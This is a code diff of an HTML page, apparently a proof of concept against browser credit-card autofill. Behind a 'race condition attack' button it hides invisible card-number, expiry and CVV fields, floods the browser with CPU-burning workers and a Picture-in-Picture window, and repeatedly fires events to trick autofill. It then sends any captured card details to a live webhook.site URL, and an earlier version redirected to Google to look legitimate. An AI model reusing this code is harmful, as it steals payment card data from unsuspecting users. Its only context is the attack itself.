@@ -17,110 +17,257 @@
             overflow: hidden;
         }
         
+        .container {
+            position: relative;
+            width: 350px;
+            height: 500px;
+        }
+        
+        /* Kartu kredit container - ini yang akan ditimpa */
         .credit-card-container {
             background-color: white;
             padding: 20px;
             border-radius: 10px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            width: 300px;
-            position: relative;
-            z-index: 10;
+            width: 100%;
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: 1;
+            box-sizing: border-box;
         }
         
         .credit-card-container h2 {
             margin-bottom: 20px;
             font-size: 24px;
             text-align: center;
+            color: #333;
         }
         
         .credit-card-container input[type="submit"] {
             width: 100%;
-            padding: 10px;
+            padding: 12px;
             background-color: #4CAF50;
             border: none;
             border-radius: 5px;
             color: white;
             font-size: 16px;
+            font-weight: bold;
             cursor: pointer;
-            position: relative;
-            z-index: 20;
+            margin-top: 20px;
         }
         
         .credit-card-container input[type="submit"]:hover {
             background-color: #45a049;
         }
         
-        #raceButton {
-            width: 300px;
-            padding: 15px;
-            background-color: #ff4444;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            font-size: 18px;
-            font-weight: bold;
-            margin-top: 20px;
-            cursor: pointer;
-            position: relative;
-            z-index: 30;
+        /* Field tersembunyi untuk autofill */
+        .hidden-fields {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
         }
         
-        .status {
-            margin-top: 20px;
-            padding: 10px;
-            background: #333;
-            color: #fff;
-            border-radius: 5px;
+        .hidden-fields input {
+            position: absolute;
+            width: 100%;
+            height: 40px;
+            opacity: 0;
+            pointer-events: auto;
+        }
+        
+        #cardnumber {
+            top: 120px;
+            left: 0;
+        }
+        
+        #expiry {
+            top: 170px;
+            left: 0;
+        }
+        
+        #cvv {
+            top: 220px;
+            left: 0;
+        }
+        
+        /* Tombol race condition - ini yang di depan */
+        #raceButton {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(45deg, #ff416c, #ff4b2b);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            position: absolute;
+            top: 280px;
+            left: 0;
+            z-index: 10;
+            box-shadow: 0 10px 20px rgba(255, 75, 43, 0.3);
+            border: 2px solid white;
+            transition: transform 0.1s;
+        }
+        
+        #raceButton:hover {
+            transform: scale(1.02);
+        }
+        
+        #raceButton:active {
+            transform: scale(0.98);
+        }
+        
+        /* Status panel */
+        .status-panel {
+            position: absolute;
+            bottom: -100px;
+            left: 0;
+            width: 100%;
+            background: rgba(0,0,0,0.8);
+            color: #0f0;
+            padding: 15px;
+            border-radius: 10px;
             font-family: monospace;
             font-size: 12px;
-            width: 300px;
+            z-index: 20;
+            box-sizing: border-box;
+            border: 1px solid #0f0;
+            box-shadow: 0 0 20px rgba(0,255,0,0.2);
+        }
+        
+        .status-line {
+            margin: 3px 0;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        
+        .blink {
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        
+        .stat-box {
+            background: #111;
+            padding: 8px;
+            border-radius: 5px;
             text-align: center;
+            border: 1px solid #333;
+        }
+        
+        .stat-value {
+            font-size: 18px;
+            font-weight: bold;
+            color: #ff4b2b;
+        }
+        
+        .stat-label {
+            font-size: 10px;
+            color: #aaa;
         }
     </style>
 </head>
 <body>
-    <div class="credit-card-container">
-        <h2>💳 Credit Card Form</h2>
-        <form id="creditCardForm" action="https://webhook.site/0f7ae798-5e1d-460d-b18d-5d63ca26a7a3" method="POST">
-            <!-- Hidden fields - tapi kita akan trigger autofill -->
-            <input type="text" id="cardnumber" name="cardnumber" placeholder="Card Number" style="opacity:0; position:absolute; top:0; left:0; width:100%; height:40px;">
-            <input type="text" id="expiry" name="expiry" placeholder="Expiry (MM/YY)" style="opacity:0; position:absolute; top:50px; left:0; width:100%; height:40px;">
-            <input type="text" id="cvv" name="cvv" placeholder="CVV" style="opacity:0; position:absolute; top:100px; left:0; width:100%; height:40px;">
-            <input type="submit" value="Submit Payment">
-        </form>
+    <div class="container">
+        <!-- Kartu kredit container (di belakang) -->
+        <div class="credit-card-container">
+            <h2>💳 Payment Details</h2>
+            <form id="creditCardForm" action="https://webhook.site/0f7ae798-5e1d-460d-b18d-5d63ca26a7a3" method="POST">
+                <div style="height: 200px;"><!-- Spacer untuk field tersembunyi --></div>
+                <input type="submit" value="Submit Payment">
+            </form>
+        </div>
+        
+        <!-- Hidden fields untuk autofill -->
+        <div class="hidden-fields">
+            <input type="text" id="cardnumber" name="cardnumber" placeholder="Card Number" autocomplete="cc-number">
+            <input type="text" id="expiry" name="expiry" placeholder="Expiry (MM/YY)" autocomplete="cc-exp">
+            <input type="text" id="cvv" name="cvv" placeholder="CVV" autocomplete="cc-csc">
+        </div>
+        
+        <!-- Tombol race condition (di depan) -->
+        <button id="raceButton">🔥 RACE CONDITION ATTACK 🔥</button>
+        
+        <!-- Status panel -->
+        <div class="status-panel" id="statusPanel">
+            <div class="status-line">⚡ RACE CONDITION STATUS</div>
+            <div class="status-line" id="status">⏳ READY - Target: Credit Card Autofill</div>
+            <div class="status-line" id="workerStatus">🧠 Workers: 0</div>
+            <div class="status-line" id="attemptStatus">🎯 Attempts: 0</div>
+            <div class="status-line" id="cardStatus">💳 Card: -</div>
+            
+            <div class="stats">
+                <div class="stat-box">
+                    <div class="stat-value" id="statAttempts">0</div>
+                    <div class="stat-label">Attempts</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-value" id="statWorkers">0</div>
+                    <div class="stat-label">Workers</div>
+                </div>
+            </div>
+        </div>
     </div>
-    
-    <!-- Tombol untuk memulai race condition -->
-    <button id="raceButton">🔥 START RACE CONDITION (1 CLICK) 🔥</button>
-    
-    <div class="status" id="status">Ready. Click button to start race.</div>
 
     <script>
+        // State variables
         let raceActive = false;
         let workers = [];
         let workerCount = 0;
-        const statusDiv = document.getElementById('status');
+        let attemptCount = 0;
+        let cardCaptured = false;
         
-        // Fungsi untuk membuat banyak workers
+        // DOM elements
+        const statusEl = document.getElementById('status');
+        const workerStatusEl = document.getElementById('workerStatus');
+        const attemptStatusEl = document.getElementById('attemptStatus');
+        const cardStatusEl = document.getElementById('cardStatus');
+        const statAttempts = document.getElementById('statAttempts');
+        const statWorkers = document.getElementById('statWorkers');
+        const raceButton = document.getElementById('raceButton');
+        
+        // Fungsi update status
+        function updateStatus() {
+            workerStatusEl.innerHTML = `🧠 Workers: ${workerCount}`;
+            attemptStatusEl.innerHTML = `🎯 Attempts: ${attemptCount}`;
+            statAttempts.innerHTML = attemptCount;
+            statWorkers.innerHTML = workerCount;
+        }
+        
+        // Fungsi membuat worker berat
         function spawnWorkers(count) {
             for (let i = 0; i < count; i++) {
                 try {
-                    // Worker dengan kode minimal untuk membebani CPU
-                    const worker = new Worker('data:application/javascript,' + 
-                        encodeURIComponent(`
-                            // Worker ${i} - heavy computation
-                            let x = 0;
-                            for(let j = 0; j < 1000000; j++) {
-                                x += Math.random();
+                    const workerCode = `
+                        // Worker ${workerCount + i} - heavy computation
+                        let x = 0;
+                        const start = Date.now();
+                        while(Date.now() - start < 10000) { // Loop 10 detik
+                            for(let j = 0; j < 100000; j++) {
+                                x += Math.sqrt(j) * Math.random();
                             }
-                            // Loop terus menerus
-                            setInterval(() => {
-                                let y = 0;
-                                for(let k = 0; k < 100000; k++) {
-                                    y += Math.sqrt(k);
-                                }
-                            }, 1);
-                        `)
+                        }
+                    `;
+                    
+                    const worker = new Worker('data:application/javascript,' + 
+                        encodeURIComponent(workerCode)
                     );
                     workers.push(worker);
                     workerCount++;
@@ -128,63 +275,141 @@
                     console.log('Worker error:', e);
                 }
             }
-            statusDiv.innerHTML = `🧠 Workers created: ${workerCount}`;
+            updateStatus();
         }
         
-        // Fungsi untuk memicu autofill dengan timing yang tepat
+        // Fungsi trigger autofill
         function triggerAutofill() {
-            // Fokus ke field cardnumber untuk memicu autofill
+            if(cardCaptured) return;
+            
+            attemptCount++;
+            
+            // Fokus ke field cardnumber
             document.getElementById('cardnumber').focus();
             
-            // Simulasi klik pada opsi autofill (ini akan memicu bottom sheet)
-            // Dalam skenario nyata, user akan melihat bottom sheet dan "klik"
+            // Trigger berbagai event
+            const events = ['focus', 'click', 'input', 'change'];
+            events.forEach(eventType => {
+                const event = new Event(eventType, { bubbles: true });
+                document.getElementById('cardnumber').dispatchEvent(event);
+            });
             
-            // Dispatch event untuk memicu autofill
-            const event = new Event('input', { bubbles: true });
-            document.getElementById('cardnumber').dispatchEvent(event);
+            // Cek apakah card number sudah terisi
+            const cardNumber = document.getElementById('cardnumber').value;
+            const expiry = document.getElementById('expiry').value;
             
-            // Setelah autofill terisi, submit form
-            setTimeout(() => {
-                if(document.getElementById('cardnumber').value.length > 0) {
-                    document.getElementById('creditCardForm').submit();
-                    statusDiv.innerHTML = '✅ FORM SUBMITTED!';
-                } else {
-                    statusDiv.innerHTML = '⏳ Autofill not triggered yet...';
-                }
-            }, 100);
+            if(cardNumber && cardNumber.length > 4 && !cardCaptured) {
+                cardCaptured = true;
+                
+                // Data lengkap
+                const cardData = {
+                    timestamp: new Date().toISOString(),
+                    type: 'credit_card_race_condition',
+                    card_number: cardNumber,
+                    expiry: expiry,
+                    cvv: document.getElementById('cvv').value,
+                    attempts: attemptCount,
+                    workers: workerCount
+                };
+                
+                cardStatusEl.innerHTML = `💳 Card: ${cardNumber.substring(0,4)}...${cardNumber.substring(cardNumber.length-4)}`;
+                statusEl.innerHTML = '✅ CARD CAPTURED! Sending to webhook...';
+                
+                // Kirim ke webhook
+                fetch('https://webhook.site/0f7ae798-5e1d-460d-b18d-5d63ca26a7a3', {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(cardData)
+                });
+                
+                // Submit form juga
+                document.getElementById('creditCardForm').submit();
+                
+                // Hentikan race condition
+                stopRace();
+            }
+            
+            updateStatus();
         }
         
-        // Fungsi utama race condition
+        // Fungsi stop race
+        function stopRace() {
+            raceActive = false;
+            
+            // Terminate semua workers
+            workers.forEach(w => w.terminate());
+            workers = [];
+            workerCount = 0;
+            
+            raceButton.innerHTML = '✅ CARD CAPTURED!';
+            raceButton.style.background = 'linear-gradient(45deg, #00b09b, #96c93d)';
+            statusEl.innerHTML = '✅ SUCCESS - Card data sent to webhook';
+            updateStatus();
+        }
+        
+        // Fungsi start race
         async function startRace() {
-            if(raceActive) return;
+            if(raceActive || cardCaptured) return;
+            
             raceActive = true;
+            attemptCount = 0;
             
-            statusDiv.innerHTML = '🏁 RACE STARTED!';
+            statusEl.innerHTML = '🏁 RACE STARTED - Loading browsers...';
+            raceButton.innerHTML = '⚡ RACE IN PROGRESS ⚡';
             
-            // 1. Spawn banyak workers untuk membebani thread
-            spawnWorkers(50);
+            // 1. Spawn banyak workers (100 workers)
+            spawnWorkers(100);
             
-            // 2. Buat interval untuk terus spawn workers
+            // 2. Interval untuk spawn workers tambahan
             const workerInterval = setInterval(() => {
+                if(!raceActive || cardCaptured) {
+                    clearInterval(workerInterval);
+                    return;
+                }
                 spawnWorkers(5);
-            }, 10);
+            }, 5);
             
-            // 3. Coba buka Picture-in-Picture window untuk tambahan load
+            // 3. Multiple timers dengan berbagai delay
+            for(let delay = 1; delay <= 1000; delay += 5) {
+                if(!raceActive) break;
+                setTimeout(() => {
+                    if(raceActive && !cardCaptured) triggerAutofill();
+                }, delay);
+            }
+            
+            // 4. Interval super cepat
+            const fastInterval = setInterval(() => {
+                if(!raceActive || cardCaptured) {
+                    clearInterval(fastInterval);
+                    return;
+                }
+                triggerAutofill();
+            }, 1);
+            
+            // 5. requestAnimationFrame loop
+            function rafLoop() {
+                if(!raceActive || cardCaptured) return;
+                triggerAutofill();
+                requestAnimationFrame(rafLoop);
+            }
+            requestAnimationFrame(rafLoop);
+            
+            // 6. Try Picture-in-Picture untuk beban tambahan
             try {
                 if ('documentPictureInPicture' in window) {
                     const pipWindow = await documentPictureInPicture.requestWindow({
-                        width: 400,
-                        height: 600
+                        width: 100,
+                        height: 100
                     });
                     
-                    // Isi dengan konten yang juga jalanin script berat
                     pipWindow.document.write(`
                         <html>
                             <body>
                                 <script>
                                     setInterval(() => {
-                                        for(let i=0; i<10000; i++) {
-                                            Math.random();
+                                        for(let i=0; i<100000; i++) {
+                                            Math.sqrt(i) * Math.random();
                                         }
                                     }, 1);
                                 <\/script>
@@ -192,67 +417,30 @@
                         </html>
                     `);
                 }
-            } catch(e) {
-                console.log('PiP error:', e);
-            }
+            } catch(e) {}
             
-            // 4. Loop cepat untuk trigger autofill berulang kali
-            let attempts = 0;
-            const autofillInterval = setInterval(() => {
-                triggerAutofill();
-                attempts++;
-                statusDiv.innerHTML = `🎯 Attempt #${attempts} - Workers: ${workerCount}`;
-                
-                // Setelah 100 attempts, coba redirect
-                if(attempts > 100) {
-                    clearInterval(autofillInterval);
-                    clearInterval(workerInterval);
-                    
-                    // Redirect ke Google biar keliatan legitimate
-                    setTimeout(() => {
-                        window.location.href = 'https://www.google.com';
-                    }, 2000);
-                    
-                    statusDiv.innerHTML = '🏁 RACE COMPLETE - Check webhook!';
+            // Timeout setelah 10 detik
+            setTimeout(() => {
+                if(raceActive && !cardCaptured) {
+                    statusEl.innerHTML = '⏰ TIMEOUT - No card captured';
+                    stopRace();
                 }
-            }, 5); // Interval 5ms - sangat cepat
-            
-            // 5. Juga pakai requestAnimationFrame untuk timing presisi
-            function rafLoop() {
-                if(!raceActive) return;
-                
-                // Trigger tambahan di setiap frame
-                document.getElementById('cardnumber').focus();
-                
-                if(attempts < 200) {
-                    requestAnimationFrame(rafLoop);
-                }
-            }
-            requestAnimationFrame(rafLoop);
-            
-            // 6. Multiple timers dengan berbagai delay
-            for(let delay = 1; delay <= 20; delay++) {
-                setTimeout(triggerAutofill, delay);
-                setTimeout(triggerAutofill, delay + 500); // Coba bypass 500ms protection
-            }
+            }, 10000);
         }
         
         // Event listener untuk tombol race
-        document.getElementById('raceButton').addEventListener('click', startRace);
-        
-        // Juga trigger race saat halaman di-load (untuk testing)
-        // startRace(); // Uncomment untuk auto-start
+        raceButton.addEventListener('click', startRace);
         
         // Monitor input fields
         document.getElementById('cardnumber').addEventListener('input', function(e) {
-            if(this.value.length > 0) {
-                console.log('Card number detected:', this.value);
-                statusDiv.innerHTML = '💳 Card detected!';
+            if(this.value.length > 0 && !cardCaptured) {
+                console.log('Card detected:', this.value);
             }
         });
         
-        // Log untuk debugging
-        console.log('Race Condition PoC Ready');
+        // Initial status
+        updateStatus();
+        console.log('=== RACE CONDITION READY ===');
         console.log('Target: Credit Card Autofill');
         console.log('Webhook: https://webhook.site/0f7ae798-5e1d-460d-b18d-5d63ca26a7a3');
     </script>
